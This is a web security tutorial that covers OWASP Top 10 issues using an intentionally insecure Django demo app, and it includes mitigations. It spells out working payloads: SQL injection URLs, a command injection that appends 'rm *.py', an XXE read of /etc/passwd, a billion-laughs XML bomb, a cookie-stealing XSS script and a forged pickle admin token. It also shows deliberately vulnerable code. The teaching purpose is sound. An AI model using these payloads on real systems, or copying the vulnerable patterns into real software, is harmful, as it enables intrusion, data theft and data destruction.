---
title: Stay paranoid and trust no one. Overview of common security vulnerabilities in web applications
created: 2020-02-06T00:00:00Z
description: Stay paranoid and trust no one. Common security issues in web applications explained with Python and Django. Examples of SQL injection and command injection. Cross-site scripting, and other common vulnerabilities.
keywords: web security, vulnerabilities, injection, sql injection, cross site scripting, django, python, javascript, tokens, pickle, user data, owasp, xss
---

- <a href="https://news.ycombinator.com/item?id=22255758">On HackerNews</a>

There's a lot of different security issues that affect web applications. However, there's a number of very common problems that occur all the time. They're quite well-known and the ways in which they can be mitigated are also well researched. This article summarises the most common issues according to Open Web Application Security Project (OWASP). Additionally, I've created a small web application in Django that showcases how some of the common security issues could be exploited.

This is based on some of the OWASP's resources such as [1] and [2]. The example Django application is available on [my github](https://github.com/lchsk/django-insecure) [3].

To run the application, get it from github and run

```
cd insecure
python manage.py runserver
```

## Injection

In general, injection refers to any case of sending hostile data to an application. Any part of the application that asks for input (URLs, text fields, etc.) are potentially vulnerable. Oftentimes, attackers try to exploit underlying technology used by the application, such as SQL (as in SQL injection) or scripting languages such as bash. Most common reason why this type of attack is possible is due to lack of input validation or validation not being strict enough (e.g. not checking types or length of input).

### SQL Injection

The most common type of injection is SQL injection. An application is potentially vulnerable if user input is not correctly handled before sending a query to the database. It can result in an attacker obtaining sensitive data about a large number of users or even modifying or deleting database records. Common remedies include:

- parameterised queries which are supported by common databases and their drivers,
- ORM libraries which should be able to internally prevent injection by e.g. parameterised queries,
- if possible, whitelists, to only accept user input from a known source.

Consider the following code from the example Django application [3].

Unsafe query where SQL injection is possible:

```
user = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')
```

This doesn't use a parameterised query and instead uses whatever an application received from a user as `user_id`. This can be easily exploited as in the following example.

An unsafe call to return a user with `user_id` = 1:

```
http://127.0.0.1:8000/security/unsafe/users/1
```

You can abuse that interface by adding `1 or id = 2` to the URL which will return two different users:

```
http://127.0.0.1:8000/security/unsafe/users/1%20or%20id%20=2
```

You can even easily request all users by providing a condition that's always true, e.g. `1 or 1`

```
http://127.0.0.1:8000/security/unsafe/users/1%20or%201
```

In that way, users data can be exploited. If the same could be applied to `UPDATE` or `DELETE` queries, it would result in data loss and outage.

In order to prevent SQL injection, one can use parameterised query which doesn't concatenate query and argument strings in Python.

```
user = User.objects.raw('SELECT * FROM security_user WHERE id = %s', (user_id,))
```

Or use ORM:

```
user = User.objects.get(id=user_id)
```

### Command Injection

It's similar to SQL injection but instead uses various system commands to inject malicious code. It can affect any component that uses a scripting language.

It can allow reading any files within the directory tree if there are no constraints on what the argument could be or what directories could be accessed. For instance:

```
http://127.0.0.1:8000/security/files/read/manage.py
```

will print Django's `manage.py` using the following code.

```
def read_file(request, filename):
    with open(filename) as f:
        return HttpResponse(f.read())
```

It's unsafe and misses validation of what `filename` can be or which files can be opened.

Even worse, it can lead to data loss.

Consider this example that tries to copy a file using shell's `cp` command. It passes `filename` argument directly to be executed by shell using `os.system`.

```
def copy_file(request, filename):
    cmd = f'cp {filename} new_{filename}'
    os.system(cmd)
    return HttpResponse("All good, don't worry about a thing :>")
```

If something like `http://127.0.0.1:8000/security/files/copy/manage.py` is executed, then simply a copy of `manage.py` called `new_manage.py` will be created. However, due to the fact that anything can be passed as `filename`, an attacker could pass in additional commands such as:

```
http://127.0.0.1:8000/security/files/copy/manage.py;%20rm%20*.py
```

which can be interpreted as `manage.py; rm *.py`. When executed, this will remove Python files in the root directory.

## Broken Authentication

Authentication and session management are not easy problems even in relatively small applications and therefore it's easy to implement them incorrectly. Attackers target applications that are not paying close attention to safe implementation and handling of security mechanisms such as passwords and tokens. If compromised, they can take over user's account and obtain sensitive information. If compromised user's account is privileged (admin account etc.) then it furthers the damage.

Common problems include allowing brute-force attacks by not providing security mechanisms to block potential threats (such as temporarily banning users, blacklisting IP addresses etc.). Some applications come with weak default passwords and provide shared accounts for multiple users. Another very common problem touches on lack of/bad password policy. According to UK's National Cyber Security Centre [4], good password policy includes:

- reducing reliance on passwords (by for example, providing multi-factor authentication),
- using password generators,
- not enforcing complexity requirements,
- avoiding short passwords,
- not expiring password automatically.

Some of it is counter-intuitive (e.g. complexity requirements which are ubiquitous but give a false sense of security without necessarily being more secure). Other suggestion, avoiding automatic password expiry, intends to encourage users to choose a hard password and stick to it, rather than changing from one weak password to another weak password regularly. 

Application's handling of passwords and tokens is critical. For example, passwords hashed using simple, outdated, or badly implemented algorithms can be cracked relatively quickly by GPUs. User tokens must be invalidated when they're no longer needed (i.e. after user logs out, or after a period of inactivity). Bad implementation of password recovery can also be a vulnerability (e.g. knowledge-based questions asked of a user can be dangerous and should be avoided).


## Sensitive Data Exposure

Many applications store a lot of sensitive data about their users, potentially data related to finance or healthcare. Attackers getting access to that can cost companies loss of reputation, users' trust, and penalties due to regulations such as GDPR in the EU. Obtaining user's data can also lead to other crimes, even outside vulnerable application, e.g. by using someone's personal data to commit credit card fraud.

Ideally, applications store as little sensitive data about users as possible. If the data is required, it should be securely stored (encrypted). Handling sensitive data is tricky and can easily leak e.g. by caching user profiles or logging. For example, consider a user profile:

```
class User:
	# ...
	def __str__(self):
		Return f’{self.name} {self.email} {self.phone}’
```

At some point, an application might want to log a user action:

```
logger.info(‘User %s created a record’, user)
```

which would cause user's name, email, and phone number to be recorded in logs (which could be stored insecurely for a long time). Instead, only something like an ID should be logged.

Unsafe password storage mechanisms mentioned before and not enforcing HTTPS could also help attackers to see sensitive information.

## XML External Entities

Common especially in older, poorly designed or misconfigured applications that use XML and accept XML as input. They can potentially be tricked into accepting dangerous content. The problem is related to the use of external entities definitions in XML (DTDs) which should be disabled in libraries parsing XML. Misconfiguration and use of buggy/outdated libraries can also contribute to the problem. Validation and whitelisting user input is also encouraged.

Example which could allow an attacker to read system file storing sensitive data (`/etc/passwd`).
```
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

A problem related to XML's entities can also cause a denial of service attack. It can also affect other formats that use references to other objects (like YAML). An attack called "billion laughs attack", shown below, exploits XML's entities that expand `log9` into a large amount of data that could not fit into memory and crash the application. In an example below, `lol9` will expand into ten `lol8`s which in turn will expand into ten `lol7`s and so on.

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## Broken Access Control

Badly implemented access control can mean that enforcing what a user can see or modify doesn't work correctly. For instance, a logged in user could get access to or delete other user's data. Or elevate their privileges and get access to admin panel.

Bad implementation can cause large amounts of data to be leaked. For instance, if integers are used as primary keys of certain resources (e.g. users), then they could be enumerated and data of many users could be stolen. Consider: 

```
http://127.0.0.1:8000/security/safe/users/1
```

This loads data of user with `id = 1`, but replacing `1` with other integers could allow access to other users' data.

Lack of testing could result in mistakes in how authentication is implemented, for instance by providing authentication for `POST` requests but not `GET` requests.

It is important to be considerate of resources that can be accessed publicly. By default, access to records should require authentication. Additionally, user permissions should be granular, i.e. they should describe what a user can do and to which records (e.g. create an object but not delete it).

In order to limit potential damage, logging and monitoring should be aware of issues such as authentication failures. Rate limits in APIs can help prevent mass exposure of data.

## Security Misconfiguration

Configuring complex software such as web servers and frameworks can be difficult and therefore prone to errors. In such cases, attackers can exploit either mistakes in configuration or bad default settings (including things such as default passwords). Lack of updates to libraries, frameworks and other components can also be a serious threat.

Default settings can cause showing too detailed error messages to users that include sensitive information (such as filenames and lines of code). For instance, shipping a Django application with a setting `DEBUG=True` will result in printing stacktraces. Other settings can, for example, make a web server list all files in a directory.


## Cross-Site Scripting (XSS)

Attackers can execute scripts in victim’s browser due to invalid treatment of user input. Whenever untrusted data (e.g. user input) is included in a web page, extra care must be taken. Successful XSS attack can result in sensitive data (e.g. credit card number) being stolen, or session being hijacked.

Any data that's going to be a part of HTML, JSON, JavaScript, CSS, URLs etc. should be treated carefully and escaped (ideally using a well-tested library). In particular, characters that can be exploited must be taken care of, such as:

```
& encoded as &amp;
< encoded as &lt;
> encoded as &gt;
" encoded as &quot;
```

Defining content security policy in headers allows to limit from where files can be loaded by a browser. For example, to load JavaScript files only from `example.com` the following policy could be used:

```
Content-Security-Policy: script-src example.com
```

Additionally, `HttpOnly` flag can be set on a cookie which tells a browser to prohibit access to cookies on the client side.

In the example Django application, there's a following URL:

```
http://127.0.0.1:8000/security/search?query=
```

which is where a search query is entered. This could be dangerous.

Code such as this

```
http://127.0.0.1:8000/security/search?query=<script>alert(%27hello%27)</script>
```

will just show a "hello" message but executing the following request:

```
http://127.0.0.1:8000/security/search?query=%3Cscript%3Enew%20Image().src=%22http://127.0.0.1:8000/security/log?string=%22.concat(document.cookie)%3C/script%3E
```

will send user's cookies to a potentially different website. In this case it goes to the same Django application which prints out the cookie, thus compromising security.

A more readable version:

```
<script>new Image().src="http://127.0.0.1:8000/security/log?string=".concat(document.cookie)</script>
```

shows that this creates a new image and tries to load it from a URL beginning with `http://127.0.0.1:8000/security/` and ending with user's cookies. Appropriate Content-Security Policy would have blocked it.


## Insecure Deserialization

Applications move a lot of data in a serialized format e.g. when passing messages between different services, or when parsing a security token. This can allow an attacker to inject dangerous code or take over user's data. This can occur whenever an application deserializes data (i.e. turns data in formats designed for storage or transfer into objects understood by a programming language). Attacks like that can affect many parts of the wider architecture, including databases, key-value stores, cookies, authentication, communication between services and others.

To help mitigate the risks, if possible, data should only be accepted from known sources (i.e. not external users). Careful handling of data should include strict validation and using hashing to verify if serialized data has been manipulated. Additionally, monitoring failures (exceptions) occurring during deserialization can catch attackers who are trying to inject malicious content into serialized messages.

As an example, consider a simple class representing a user:

```
@dataclass
class TestUser:
    perms: int = 0
```

Field `perms` can be understood as access level a user has, `0` for ordinary users and `1` for administrators.

The request handler, presented below, decodes a token encoded using `base64` and then tries to "unpickle" it using Python's `pickle` module from the standard library. The intention is to transfer the data stored in a token into an instance of `TestUser` class. Then, `perms` field is checked and different output is shown depending on whether the application thinks it's dealing with an administrator or not.

```
def admin_index(request):
    token = base64.b64decode(request.COOKIES.get('silly_token', ''))
    user = pickle.loads(token)

    if user.perms == 1:
        return HttpResponse('Hello Admin')

    return HttpResponse('No access')
```

This is unsafe and can be abused.

Pickled test user looks like this:

```
b'\x80\x03csecurity.views\nTestUser\nq\x00)\x81q\x01}q\x02X\x05\x00\x00\x00permsq\x03K\x00sb.'
```

An attacker could notice the last part, `permsq\x03K\x00sb.`, includes the string `perms`. If it's changed to `permsq\x03K\x01sb` (just a change from `0` to `1` which is the value of `perms`), an encoded token could be inserted into a cookie. After visiting http://127.0.0.1:8000/security/admin/ an attacker would see "Hello Admin" and that way gain access to the closed-off part of the application.

This shows that one have to be careful when deserializing data obtained from external sources.

## Using Components with Known Vulnerabilities

Typical application has many dependencies such as libraries, frameworks, servers etc. Each of them can have their own vulnerabilities that when detected need to be updated. It's important to have a process for tracking and updating dependencies regularly. This can be difficult and time-consuming if an application has many different dependencies, especially if they're relatively obscure or no longer maintained.

## Insufficient Logging & Monitoring

Sufficient logging, monitoring, and alerting can detect an attack at an earlier stage, thus minimising the damage. Left unchecked, attackers can spend more time preparing their attack and expose other parts of the application, causing even a wider breach. Often, it's not the victim that detects an attack, but rather a third-party. It also typically happens much later; in 2016 it took an average of 191 days to detect a security problem [1]. In short, the sooner an attack can be detected, the less damage it's likely to cause.

That's why it's advised to not only monitor application errors (such as programming language exceptions) but also suspicious activity. Events such as failed logins, password changes can be logged and alerts may be raised if reasonable thresholds are breached. Whether sufficient amount of logs and alerts is set up can be tested via penetration testing. Certain critical actions, such as sign ins and password changes, can be logged as part of an audit log to ease investigations of suspicious activity. Having a process for responding to and escalating potential security issues is necessary to avoid missing alerts raised by automated systems.

Automated monitoring can warn about issues such as malicious script trying to log in to a user's account using a database of common passwords.

## How to detect and prevent vulnerabilities?

- Education and review

Being aware of attacks that could happen makes it easier to spot them in code reviews.

- Testing and monitoring

Alerts based on events such as failed login attempts can help prevent attacks.

- Automation

There are automated tools that can help find potential security concerns.

## Automation

In case of Python, there's `bandit` [5] project which can automatically find many potential threats and report them.

To run it on the example Django application, execute:

```
bandit -r ./insecure/security
```

This will print a number of messages, along with corresponding code. Some of them will be related to concerns mentioned before.

For instance, it warns of a "possible SQL injection" where it indeed can occur.

```
>> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
   Severity: Medium   Confidence: Low
   Location: insecure/security/views.py:13
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html
12	def unsafe_users(request, user_id):
13	    users = User.objects.raw(f'SELECT * FROM security_user WHERE id = {user_id}')
```

It also does warn about use of `pickle` module and how unsafe it can be.

```
>> Issue: [B301:blacklist] Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.
   Severity: Medium   Confidence: High
   Location: insecure/security/views.py:51
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b301-pickle
50	
51	    user = pickle.loads(token)
```

## Summary

This article presented a number of common security concerns that can occur in web applications. Due to how widespread and serious can they be, it's necessary to be aware of risks and how to mitigate them.

## Footnotes


[1] https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf

[2] https://cheatsheetseries.owasp.org

[3] https://github.com/lchsk/django-insecure

[4] https://www.ncsc.gov.uk/files/password_policy_infographic.pdf

[5] https://github.com/PyCQA/bandit

